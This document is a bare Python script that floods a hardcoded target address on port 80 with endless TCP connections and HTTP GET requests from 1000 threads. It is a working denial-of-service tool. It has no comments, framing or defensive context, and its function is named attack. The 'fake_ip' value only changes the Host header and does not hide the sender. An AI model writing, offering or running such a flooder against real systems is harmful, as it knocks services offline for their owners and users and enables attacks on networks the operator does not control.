import socket
import threading

target = "192.168.1.1"
port = 80
fake_ip = "0.0.0.0"

already_connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode("ascii"),(target,port))
        s.sendto(("HOST: "+fake_ip+"\r\n\r\n").encode("ascii"),(target,port))
        s.close()

        global already_connected
        already_connected += 1
        if already_connected % 1000 == 0:
            print(already_connected)



if __name__ == "__main__":
    for i in range(1000):
        thread = threading.Thread(target=attack)
        thread.start()


